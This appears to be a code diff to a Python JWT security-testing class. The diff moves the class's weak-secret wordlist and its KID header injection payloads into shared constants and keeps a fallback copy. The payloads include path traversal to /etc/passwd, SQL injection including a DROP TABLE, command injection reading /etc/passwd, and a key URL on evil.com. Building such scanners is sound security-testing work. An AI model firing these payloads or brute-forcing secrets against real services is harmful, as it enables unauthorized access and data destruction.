@@ -41,6 +41,19 @@ try:
 except ImportError:
     HAS_PYJWT = False
 
+# 导入共享常量
+try:
+    from core.constants import (
+        KID_INJECTION_PAYLOADS as _KID_PAYLOADS,
+        WEAK_SECRETS as _WEAK_SECRETS,
+    )
+
+    _HAS_CONSTANTS = True
+except ImportError:
+    _HAS_CONSTANTS = False
+    _WEAK_SECRETS = []
+    _KID_PAYLOADS = []
+
 
 class JWTTester(BaseAPITester):
     """
@@ -60,81 +73,30 @@ class JWTTester(BaseAPITester):
     description = "JWT令牌安全测试器"
     version = "3.0.0"
 
-    # 常见弱密钥列表
-    WEAK_SECRETS = [
-        # 常见密码
-        "secret",
-        "password",
-        "123456",
-        "key",
-        "private",
-        "jwt_secret",
-        "api_secret",
-        "token_secret",
-        "auth_secret",
-        "supersecret",
-        "mysecret",
-        "admin",
-        "test",
-        "demo",
-        "changeme",
-        "letmein",
-        "welcome",
-        "passw0rd",
-        # 常见密钥名
-        "jwt-secret",
-        "jwt_key",
-        "secret_key",
-        "SECRET_KEY",
-        "JWT_SECRET",
-        "API_KEY",
-        "app_secret",
-        "application_secret",
-        # 开发环境常见
-        "development",
-        "production",
-        "staging",
-        "testing",
-        "dev_secret",
-        "prod_secret",
-        "local_secret",
-        # 字符串变体
-        "",
-        " ",
-        "null",
-        "undefined",
-        "none",
-        "nil",
-        # 常见短密钥
-        "a",
-        "abc",
-        "1234",
-        "abcd1234",
-        "qwerty",
-        # JWT相关
-        "HS256-secret",
-        "hmac-secret",
-        "your-256-bit-secret",
-        "your-secret-key",
-        "my-secret-key",
-        "super-secret-key",
+    # 使用共享常量 (向后兼容)
+    WEAK_SECRETS = _WEAK_SECRETS if _HAS_CONSTANTS else [
+        "secret", "password", "123456", "key", "private", "jwt_secret",
+        "api_secret", "token_secret", "auth_secret", "supersecret", "mysecret",
+        "admin", "test", "demo", "changeme", "letmein", "welcome", "passw0rd",
+        "jwt-secret", "jwt_key", "secret_key", "SECRET_KEY", "JWT_SECRET",
+        "API_KEY", "app_secret", "application_secret", "development",
+        "production", "staging", "testing", "dev_secret", "prod_secret",
+        "local_secret", "", " ", "null", "undefined", "none", "nil",
+        "a", "abc", "1234", "abcd1234", "qwerty", "HS256-secret", "hmac-secret",
+        "your-256-bit-secret", "your-secret-key", "my-secret-key", "super-secret-key",
     ]
 
-    # KID注入Payload
-    KID_INJECTION_PAYLOADS = [
-        # 路径遍历
+    # 使用共享常量 (向后兼容)
+    KID_INJECTION_PAYLOADS = _KID_PAYLOADS if _HAS_CONSTANTS else [
         ("../../../etc/passwd", "path_traversal"),
         ("../../../../../../etc/passwd", "deep_path_traversal"),
         ("../../../../../../dev/null", "dev_null"),
         ("/dev/null", "absolute_dev_null"),
-        # SQL注入
         ("' OR '1'='1", "sql_injection"),
         ("'; DROP TABLE users;--", "sql_injection_drop"),
         ("1' UNION SELECT 'secret'--", "sql_union"),
-        # 命令注入
         ("| cat /etc/passwd", "command_injection"),
         ("; ls -la", "command_injection_semicolon"),
-        # URL相关
         ("http://evil.com/jwks.json", "external_url"),
         ("file:///etc/passwd", "file_protocol"),
     ]
